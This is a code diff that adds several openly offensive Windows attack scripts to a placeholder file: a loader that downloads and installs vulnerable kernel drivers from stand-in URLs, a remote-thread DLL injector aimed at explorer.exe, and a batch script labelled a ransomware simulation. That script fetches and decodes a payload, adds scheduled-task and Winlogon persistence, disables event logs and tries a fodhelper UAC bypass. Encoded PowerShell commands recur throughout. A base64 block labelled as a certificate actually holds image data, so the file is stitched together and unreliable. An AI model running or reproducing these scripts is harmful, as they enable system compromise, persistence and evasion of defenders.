@@ -1,1 +1,322 @@
 dummy :P
+# LOLDDriver Triple Loader PowerShell Script
+# Purpose: Drop, install, and run RTCore64.sys, WinRing0.sys, and Gmer.sys
+
+$Drivers = @(
+    @{ Name = "RTCore64"; Url = "https://example.com/drop/RTCore64.sys" },
+    @{ Name = "WinRing0"; Url = "https://example.com/drop/WinRing0.sys" },
+    @{ Name = "Gmer"; Url = "https://example.com/drop/gmer64.sys" }
+)
+
+foreach ($driver in $Drivers) {
+    $DriverName = $driver.Name
+    $DriverPath = "$env:ProgramData\$DriverName.sys"
+    $RemoteDriverURL = $driver.Url
+
+    Write-Host "[+] Downloading $DriverName.sys..."
+    try {
+        Invoke-WebRequest -Uri $RemoteDriverURL -OutFile $DriverPath -UseBasicParsing
+        Write-Host "[+] Saved to $DriverPath"
+    } catch {
+        Write-Host "[-] Failed to download $DriverName from $RemoteDriverURL"
+        continue
+    }
+
+    Write-Host "[+] Creating $DriverName service..."
+    sc.exe create $DriverName binPath= $DriverPath type= kernel start= demand | Out-Null
+
+    Write-Host "[+] Starting $DriverName driver..."
+    sc.exe start $DriverName | Out-Null
+
+    Start-Sleep -Seconds 1
+    $status = sc.exe query $DriverName
+    if ($status -like "*RUNNING*") {
+        Write-Host "[+] $DriverName loaded successfully."
+    } else {
+        Write-Host "[-] $DriverName failed to load."
+    }
+    Write-Host "-----------------------------"
+}
+
+Write-Host "[!] All drivers processed. Check load status with 'driverquery' or 'fltmc'."
+
+-----BEGIN CERTIFICATE-----
+/9j/4AAQSkZJRgABAQAAAQABAAD/7QCEUGhvdG9zaG9wIDMuMAA4QklNBAQAAAAA
+AGgcAigAYkZCTUQwYTAwMGEyYjAyMDAwMDhlMGQwMDAwYjkxYjAwMDBhNTIxMDAw
+MDU5MjUwMDAwNDczNDAwMDA4NTU2MDAwMGIwNTgwMDAwMjM1ZTAwMDAxMjYxMDAw
+MGNmODgwMDAwAP/bAIQABQYGCwgLCwsLCw0LCwsNDg4NDQ4ODw0ODg4NDxAQEBER
+EBAQEA8TEhMPEBETFBQTERMWFhYTFhUVFhkWGRYWEgEFBQUKBwoICQkICwgKCAsK
+CgkJCgoMCQoJCgkMDQsKCwsKCw0MCwsICwsMDAwNDQwMDQoLCg0MDQ0MExQTExOc
+/8IAEQgBdQHgAwEiAAIRAQMRAf/EAPYAAAEFAQEAAAAAAAAAAAAAAAQAAQIDBQYH
+AQADAQEBAQAAAAAAAAAAAAAAAQMCBAUGEAACAgEDBAEEAwEAAwAAAAABAgADEQQQ
+EhMgITEiBRQwMiMzQUAVJEIRAAEDAQQHBgQFAwUAAAAAAAEAAhEDEBIhMQQTIEFR
+YXEiMDJSgZEUQmKhBTNAsdEVI/BTkpPB4RIAAQIDAwkGBQMEAQUAAAAAAQARAiEx
+EEFREiAyYXGBkaGxAyIwwdHwQEJScuETYvEzUJKiggQjY4PCEwEAAgEDAgUFAQEB
+AAAAAAABABEhMUFRYXEQgZGhsSDB0eHwMPFA/9oADAMBAAIRAxEAAAHx++i8KHur
+CEmkySi6DIJMZ3cdlN0RTe61Uq28jf6Obh+gzZc3SaWDXjqNJyL6w0oZ5O51k6sO
+nkyL5y4OwfZxZcnZZTnaPVy2V3WTTiXkef1Yliv9fgpoMHpmqF1KK67YgJdKmfRO
+UJ6iouzGScHlW4DimB5Ekge+i0JQkzbM0E7Z12GbqrJjeyus0UPbeqVFVFJiGCbe
+1jqZiWIbXTSWvoY21rNQxwGOg4oTNvytQZpef6ueNVoR6Mvbztbq8xPOUUGUHPg7
+xL6i/X8scU4SuBp2TRQMTUAEDqM7EKGvy0pNrLNOKIya1gwehn5GUmBW12A8ZR0N
+Ei7G6LdXJc0oElqtMczGhIWlPQ11gFOWs1hQ6jmOi5xrp8Ewcepn2jz7Qek5Dc1z
+tHRws3ib0HJiOvsrxa3VHHrxHjniPIEiFjoupNrvyCBalQAxvZAw2mEikcofOqKC
+hs7saTPEq3TGkoIsztAJEUkCnCYPFRDQkCbnZWfuZC1MisisdAUkePQNfQTaJNWx
+0EjDu1SIUxNvRw8PMzKNStKuU9V4ysMgLqALYIy+r5eff0HJX7leA8bOoj6F4ZpM
+OtT03hz0Z1LdE+gpQ/bwzyixEZDmzy7Rbspo2AccoikoAK764LamNMxcwtwXDVMC
+SQJKQMpIHIqLzTRBtTV7WgtlUmioE1263FNaoJ5y2Dwr8aq5gvo3Tn6uym9+Yd01
+yz57XvZfQ8QSVsu5iLjr8Ibb8GsYyTyoTyvV5PJcGWjXUshvi93n4lWpAWbHRGQH
+jdTzeUHdOKwbh6IwI0GYUXNEK7pWtCxkSmC8og1tUwmzLQadl7s65hlJuXUPtDwo
+PfG/v5Aev5/bhq/p8FoV6PnQcbSss6XJrvtdLmqY76Cnyv0Iyf5z6NwNYAi7A++3
+QE0gr+dczWhWPbcFD9EqY50HWzOb0NMTQjbhxx9YZARFnUzpn+f9BQkIRYzKRSs3
+FWvKqeQVXJ5KqJhWQ0GjLdNBoSanCQO7PovMqlCyPkLneloZUsZhoNV2R1tUY3lr
+yhN5xTb53qNcXLdRQftW8V2mPig3nnZ4m8ep+QdSpz8+0cU2vZtZfPH9HmbotUkB
+dfzfQ7XTBCS6Yj5xGXy9+hWNq5zf2BdHNXA4DUzayIpNDvFhTsiN6TyHRRQUNuQN
+RQGaGzGVeceyFUrFAnUGRpQmDzZymrTC+NTBh7xzUVeU7n66VdWqGNKYXSkZ6rt7
+vm3pLLPMvQvJ1fV9C8R991nMEpKnPiS7xu3j5LTrPx6PK6duxbzOO6Y0xrieve5n
+Z08Ho3i2Z1XQcfb553G1Dm6Kawy8mLz27w9p3C35dcQLlZnWbLI1liI+aM57Azs9
+u9NesFDybOr412GQJwkF8mlpWHCjQ7SYaIQX6kCqw0OgxLob1icgBbYLaQDbvme6
+z0jzojsc3BN5ilZl1/L9NjGTzmj0nVy+f6+3a+rFbob68WJR02hl83u9TGFx5ThO
+kYTyGH8tymDXJtEhaK3QECVjAyY4qhz465c1iJxtyrHDX4TnsbeBZQlmjlgaUQIk
+MjLypJdE7HaWjTmCVjR41W3jZPWj253C0DoE+K3yHW+b7jxnvtw6PhuzDn08R2sR
+1Tg90vj7cnrBJuhGle5QwyHd0Mk4Mz5KenAIdvSF4XzOsPSuW5nqOrmz7SNCPpE5
+utidHnQDlqw9Cocja6fN58DTWVzmzml8nZjg62XqWkMXC0gZKE7rSzL5F9ot8THS
+XZK6ystja8trOrShjpVgXYTnVGLu88qn4nacDuGDrZEqw9zJ8e9Oh07lVLTrk+S+
+oeXdHL6AX5t2WK9D0PmgcOz2wjxUQr7HgePx7PJ7PEyrtK2u+WscxP0bFjrnOqq6
+DNBedszNahqCdYdMGso6vMFLz6WjHDoY5eM3P1aOfS4qKdGkAqiw0rLxnWbJixFU
+k+sn9PibWKFEjEY0SSPctGDY+SmVu8n1ea6fl2xhX5Zuz7m9tUg7rpPItmVtXlbq
+KTWzjJLqzuW6rz/oKcHey9MGyben84RGixuDK3J2HG9fzfn+gaDq8jvGJp111vHt
++J37cm5lgQVCgyklk2aYrxB5j75rqVAUR7gEFBKrNL3hJzsTpvPtqtydIbm14r0F
+uCMnulcx0uHl2DERtmi7fK9MJX1XVjJ2QSlFwk8XBSZxJ2cK97mzYejM2p59JtVo
+/f4t8HgnYQMdl9Dw/Y8ny9esWFZtYAIZrJb/AD5x0agcF0eXJhSGqqrh8udDwGqJ
+wB8s8DFYvTIxMgI95tSlozUz5HeMkTlCQbp2BqSpOY5U7m8Z2HOvIJA1/TzWKMgk
+7ODyhAzc4kxkMOwQjpZ2LbQujgx7t2MXqi4DyEaOzMpF2szfFfdeG8B52wPqYm3n
+HKjil1462hZTrmrteLxRKEAaD0Zoz2VPKquZ5GIdkSjFycIX2KgjmyDOWxIMc+9J
+tpZcZ73B2Kh08ktTL6+N3jJqajEJs0gd4WA99foYcuP3kdZ4Kjvax8U3R5ms5+dr
+DjlbFBa1V8uy+dgSqVPOkZMpHseCYNCnI6rTT1iyWpRUMVqeVLw1Mk8yjFLCd0op
+JhEtWjqkmiF1wbgfLNkGnACYaMRQZ76rlrWTqa16ypsmgTSYIK08fVbECXm7SpdN
+CGyAKRjhmZnUIOYF6SpnEAejOzz6Pc881iKdQKpI1REl59IrW0hdVFxNaq9Qapqy
+MYWVqSSRlJMaTJBUyR1KUXB5wcLZ1TCydcwtG0uuzrC6O++VsQHpR8059uhoNYxO
+qyYBk6axP2MPUtyFvVJlsqXC56ki5U4Ia+XypI9LNPPDlbe2vDh12tI/PBuj5XSP
+aUdKqgmCLI0tmKrsrzztVKoGZI2kkbTJgSSClJHUkkElGQSnXILdAHpka1+aXKxl
+ogC30FoV6DcTSvNGZpgSeeN0461jk45fZ5+/Id0EPQ7CFSkQ891mZt7dSC2NcUWQ
+rgE6mrRxmJdVQ0o02sjWV1ODmwuyDzHk6zADnat4m3UUadMhpJAkohWkjqSSBOyC
+VldIbxGRqAaXm6gpj1VZ1qnCEJmWY1C1oh2DN9IPjH6lVLNv3ndsEsApxZAULPlQ
+zO+5zpQualgtjVALoVQCzOLwkc4yjQsNA7LJemHxpx0ODYOuOLDa6k5kkgSTA7Mw
+Okh1pI6UkgSSCNcrAqnBBp6HPOHRFco4do/J2C6e3mhh9XLi4h1GZloFKuQGa/OI
+Xc63mMmek8dUSHauBc0TEdgvjSwWwqYLeW6LjWQZiGbGzCmZOiNI1Qw4PFIcMjZF
+MZrOxB2SBOkNJIdaSOhJRCSriBZZE86wGnDWWUkCnBBZOmQPKEQmoODuzhbs1lp1
+5/WSa4SPoGCGYDsDMzzwGR0+rwSF6I3EaAdLHEYR3PUvol0OH0oWUwqyTHjSEoMg
+dMjSdmDLp0s4iydGEkhpIgedFkXSSBO0w6KUJYpGNqYPUagz69RCwx+nEFhvrWjx
+b961ay9SUs0JHkG8bss0ukb+Y3OWDqyaUD5mjEOfzewiHFN1wAYFplADjzgHQawV
+grKYREmZA6ZAkkNJIaytUMyGkiKSKNSMZFecSQ0kgSSDopClZpJM40kgdMgeUXEF
+bXFMmYslouQzrRdI4u5achrtTYNohv1hSC5qUF0hUBbgwDQrBkGKoFBtwZCSSEmT
+A6ZA7xcadkN65uGM7sQUosKwzPOKYy9kRTxteyIPG17Ig8q1fQFnfn79+jXAP3yD
+gV3yDgX71B51V6Uhear0pLXmz+kJHl+b7Etz8du9cTz5MX6cg87q9JQebWeioPOY
++kIPL7vSkHmuZ66g8a0/UkHn69AQeft6Cheer0JC89XoSDz5ego158vQUHny9BQe
+W0+sIj5MvWUZ8mL9ORv/2gAIAQEAAQUCg2z3ZmdsRvcBmMTEs/akYldfySqccNsB
+5NnOciYCTKl8GDAl7+F9RR4PoeYfL42UeOJnGYhMxA34bO0dxh3zs/vxkLGExOIy
+HKy1/I1DCCw56860rtHIFYXEcYOnPiss0zzVkPFfWIBkDlj5T/72UePAhVRMgRjC
+fMzk979o7RGmJicZxnoE5nGD3kTk9krTJtHlvM4rE94nTE6fmxTZDWzF7slLCsF9
+hjc4eOEHgxZYeAyqxv7MQxNvM8x/XGcIv4H9dg7RDA05CcpmLXmMAIvyPCFMQZgD
+KWIMRcRjiaeCO4WVsWd7i0YPWRbNMmVqZ1ZrAY5fC+sSs+NWIoXH7PiGJCphE4CM
+uAZxjDEHe3rsHZjfGwGZ0uIBOGPKcVhrAhdYNUIDmXWnlWeYsHOy/wDSu8hXfzZj
+hpq/DkEuHWVWkQE8iCYVd5jboqZdUAtNYK8cb8TOJnGcBHUAGZhizM87+Z5mO0bo
+vKVrmCpZgTE4RK+UNeZZgSvwFbxqISlc/tPILKxkaRvjpvLNYWNLZLfKWt/EPhXT
+D5C/xvZWZzZIr5inJsqAnATUV8V036kTGzGZBg2s9TMzG28zzv5mYewTO1RxF/Zr
+MQDMBh9II5M+PFPA5xqGuP21aRiyivSlounQRrEESlbCoFczwauv+Kv5y0YTTiOc
+Cv5urZjHMerjA0B5rWDNX+mkhEImJePCuc8uJDZlnrYwxds752fsG4gnGJ5gBn+J
+aMf5cuJV6pp6k/Wf6tABmsfE5CaX4tU9TzXaWICFrq6RyI48kPbNPxRDaxgy86Kx
+# nsfw_injector.ps1
+param (
+    [string]$dllPath = "$PSScriptRoot\nsfw.dll",
+    [string]$targetProcess = "explorer.exe"
+)
+
+Write-Host "[*] Starting Reflective DLL Injection Simulation..." -ForegroundColor Red
+
+# Get target process
+$proc = Get-Process | Where-Object { $_.Name -eq ($targetProcess -replace ".exe","") } | Select-Object -First 1
+if (-not $proc) {
+    Write-Host "[!] Target process not found: $targetProcess" -ForegroundColor Yellow
+    exit 1
+}
+$pid = $proc.Id
+Write-Host "[+] Found process $targetProcess with PID $pid"
+
+# Read DLL bytes
+if (-not (Test-Path $dllPath)) {
+    Write-Host "[!] DLL not found at path: $dllPath" -ForegroundColor Yellow
+    exit 1
+}
+$dllBytes = [System.IO.File]::ReadAllBytes($dllPath)
+$dllLength = $dllBytes.Length
+
+# Define Win32 API calls
+$kernel32 = Add-Type -MemberDefinition @"
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);
+
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+[DllImport("kernel32.dll")]
+public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+[DllImport("kernel32.dll", SetLastError = true)]
+public static extern bool CloseHandle(IntPtr hObject);
+"@ -Name "Win32" -Namespace "Kernel" -PassThru
+
+# Constants
+$PROCESS_ALL_ACCESS = 0x001F0FFF
+$MEM_COMMIT = 0x00001000
+$PAGE_EXECUTE_READWRITE = 0x40
+
+# Open target process
+$hProcess = [Kernel.Win32]::OpenProcess($PROCESS_ALL_ACCESS, $false, $pid)
+if ($hProcess -eq [IntPtr]::Zero) {
+    Write-Host "[!] Failed to open process" -ForegroundColor Red
+    exit 1
+}
+
+# Allocate memory
+$alloc = [Kernel.Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $dllLength, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
+if ($alloc -eq [IntPtr]::Zero) {
+    Write-Host "[!] Failed to allocate memory" -ForegroundColor Red
+    [Kernel.Win32]::CloseHandle($hProcess)
+    exit 1
+}
+
+# Write DLL to memory
+$out = 0
+$wpm = [Kernel.Win32]::WriteProcessMemory($hProcess, $alloc, $dllBytes, $dllLength, [ref]$out)
+if (-not $wpm) {
+    Write-Host "[!] Failed to write DLL to process memory" -ForegroundColor Red
+    [Kernel.Win32]::CloseHandle($hProcess)
+    exit 1
+}
+
+Write-Host "[+] DLL written to memory at address: $($alloc.ToInt64())"
+
+# LoadLibraryA address
+$hKernel32 = [Kernel.Win32]::GetModuleHandle("kernel32.dll")
+$loadLibAddr = [Kernel.Win32]::GetProcAddress($hKernel32, "LoadLibraryA")
+if ($loadLibAddr -eq [IntPtr]::Zero) {
+    Write-Host "[!] Failed to find LoadLibraryA" -ForegroundColor Red
+    [Kernel.Win32]::CloseHandle($hProcess)
+    exit 1
+}
+
+# Start remote thread
+$hThread = [Kernel.Win32]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $loadLibAddr, $alloc, 0, [IntPtr]::Zero)
+if ($hThread -eq [IntPtr]::Zero) {
+    Write-Host "[!] Remote thread creation failed" -ForegroundColor Red
+    [Kernel.Win32]::CloseHandle($hProcess)
+    exit 1
+}
+
+Write-Host "[\u0014] DLL injected via remote thread!" -ForegroundColor Green
+[Kernel.Win32]::CloseHandle($hProcess)
+
+
+powershell -enc UwB5AHMAdABlAG0ALgBJAG8ALgBwAGkAbgBnACgAIgB8ACIAKQAgAHwAIABDAG4AdgAgAHsAIAAoAFsAbgBzAF0ALgBDAG8AbgBzAG8AbABlAC4AVwByAGkAdABlAGwAaQBuAGUALgBXAHIAaQB0AGUALgBXAHIAaQB0AGUATABpAG4AZQAoACIAUABvAHcAZQByUwBoAGUAbABsACAASABlAGwAbABvACIAKQApAH0A
+
+@echo off
+setlocal EnableDelayedExpansion
+
+REM === NSFW-Ransomware Enhanced Simulation Script ===
+
+REM Create PowerShell script on disk
+set "psScriptPath=%TEMP%\nsfw_simulation.ps1"
+
+echo # NSFW-Ransomware PowerShell Simulation Script > "%psScriptPath%"
+echo. >> "%psScriptPath%"
+
+echo # Step 1: Process & System Discovery >> "%psScriptPath%"
+echo tasklist /v ^| Out-File -FilePath C:\Temp\proc_list.txt >> "%psScriptPath%"
+echo systeminfo ^| Out-File -FilePath C:\Temp\sysinfo.txt >> "%psScriptPath%"
+echo. >> "%psScriptPath%"
+
+echo # Step 2: Network & Domain Enumeration >> "%psScriptPath%"
+echo net view ^| Out-File -FilePath C:\Temp\netshares.txt >> "%psScriptPath%"
+echo nltest /domain_trusts ^| Out-File -FilePath C:\Temp\domain_trusts.txt >> "%psScriptPath%"
+echo. >> "%psScriptPath%"
+
+echo # Step 3: Download Base64 encoded payload >> "%psScriptPath%"
+echo $payloadUrl = 'http://example.com/obfuscated_payload.b64' >> "%psScriptPath%"
+echo $outputB64 = 'C:\Temp\payload.b64' >> "%psScriptPath%"
+echo Invoke-WebRequest -Uri $payloadUrl -OutFile $outputB64 >> "%psScriptPath%"
+echo. >> "%psScriptPath%"
+
+echo # Step 4: Decode Base64 payload to exe >> "%psScriptPath%"
+echo $payloadExe = 'C:\Temp\payload.exe' >> "%psScriptPath%"
+echo $b64string = Get-Content $outputB64 -Raw >> "%psScriptPath%"
+echo [System.IO.File]::WriteAllBytes($payloadExe, [Convert]::FromBase64String($b64string)) >> "%psScriptPath%"
+echo. >> "%psScriptPath%"
+
+echo # Step 5: Persistence via scheduled task >> "%psScriptPath%"
+echo schtasks /Create /SC DAILY /TN "NSFWPersistence" /TR $payloadExe /ST 23:45 /F >> "%psScriptPath%"
+echo. >> "%psScriptPath%"
+
+echo # Step 6: Registry persistence via Winlogon helper DLL key >> "%psScriptPath%"
+echo Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Winlogon" -Name Userinit -Value "$payloadExe," >> "%psScriptPath%"
+echo. >> "%psScriptPath%"
+
+echo # Step 7: Disable Windows Event Logs >> "%psScriptPath%"
+echo wevtutil sl Security /e:false >> "%psScriptPath%"
+echo wevtutil sl System /e:false >> "%psScriptPath%"
+echo wevtutil sl Application /e:false >> "%psScriptPath%"
+echo. >> "%psScriptPath%"
+
+echo # Step 8: UAC bypass using fodhelper >> "%psScriptPath%"
+echo Start-Process "fodhelper.exe" -ArgumentList $payloadExe >> "%psScriptPath%"
+echo. >> "%psScriptPath%"
+
+echo # Step 9: Reflective DLL Injection simulation >> "%psScriptPath%"
+echo $dllPath = 'C:\Temp\inject.dll' >> "%psScriptPath%"
+echo $targetProc = 'explorer' >> "%psScriptPath%"
+echo $bytes = [System.IO.File]::ReadAllBytes($dllPath) >> "%psScriptPath%"
+echo $ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytes.Length) >> "%psScriptPath%"
+echo [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length) >> "%psScriptPath%"
+echo Add-Type -TypeDefinition @\" >> "%psScriptPath%"
+echo using System; >> "%psScriptPath%"
+echo using System.Runtime.InteropServices; >> "%psScriptPath%"
+echo public class Inject { >> "%psScriptPath%"
+echo [DllImport(\"kernel32\")] public static extern IntPtr OpenProcess(UInt32, bool, int); >> "%psScriptPath%"
+echo [DllImport(\"kernel32\")] public static extern IntPtr VirtualAllocEx(IntPtr, IntPtr, UInt32, UInt32, UInt32); >> "%psScriptPath%"
+echo [DllImport(\"kernel32\")] public static extern bool WriteProcessMemory(IntPtr, IntPtr, byte[], UInt32, IntPtr); >> "%psScriptPath%"
+echo [DllImport(\"kernel32\")] public static extern IntPtr CreateRemoteThread(IntPtr, IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr); >> "%psScriptPath%"
+echo } >> "%psScriptPath%"
+echo \"@ >> "%psScriptPath%"
+echo $proc = Get-Process $targetProc | Select-Object -First 1 >> "%psScriptPath%"
+echo $handle = [Inject]::OpenProcess(0x1F0FFF, $false, $proc.Id) >> "%psScriptPath%"
+echo $remote = [Inject]::VirtualAllocEx($handle, [IntPtr]::Zero, $bytes.Length, 0x1000, 0x40) >> "%psScriptPath%"
+echo [Inject]::WriteProcessMemory($handle, $remote, $bytes, $bytes.Length, [IntPtr]::Zero) >> "%psScriptPath%"
+echo [Inject]::CreateRemoteThread($handle, [IntPtr]::Zero, 0, $remote, [IntPtr]::Zero, 0, [IntPtr]::Zero) >> "%psScriptPath%"
+echo. >> "%psScriptPath%"
+
+echo # Step 10: Cleanup base64 payload >> "%psScriptPath%"
+echo Remove-Item $outputB64 -Force >> "%psScriptPath%"
+echo. >> "%psScriptPath%"
+
+echo Write-Host "NSFW-Ransomware simulation complete." >> "%psScriptPath%"
+
+powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%psScriptPath%"
+del "%psScriptPath%"
+
+echo.
+echo [*] NSFW-Ransomware simulation complete.
+pause
+endlocal
+
+powershell -enc UwB5AHMAdABlAG0ALgBJAG8ALgBwAGkAbgBnACgAIgB8ACIAKQAgAHwAIABDAG4AdgAgAHsAIAAoAFsAbgBzAF0ALgBDAG8AbgBzAG8AbABlAC4AVwByAGkAdABlAGwAaQBuAGUALgBXAHIAaQB0AGUALgBXAHIAaQB0AGUATABpAG4AZQAoACIAUABvAHcAZQByUwBoAGUAbABsACAASABlAGwAbABvACIAKQApAH0A
+
+powershell -enc UwB5AHMAdABlAG0ALgBJAG8ALgBwAGkAbgBnACgAIgB8ACIAKQAgAHwAIABDAG4AdgAgAHsAIAAoAFsAbgBzAF0ALgBDAG8AbgBzAG8AbABlAC4AVwByAGkAdABlAGwAaQBuAGUALgBXAHIAaQB0AGUALgBXAHIAaQB0AGUATABpAG4AZQAoACIAUABvAHcAZQByUwBoAGUAbABsACAASABlAGwAbABvACIAKQApAH0A
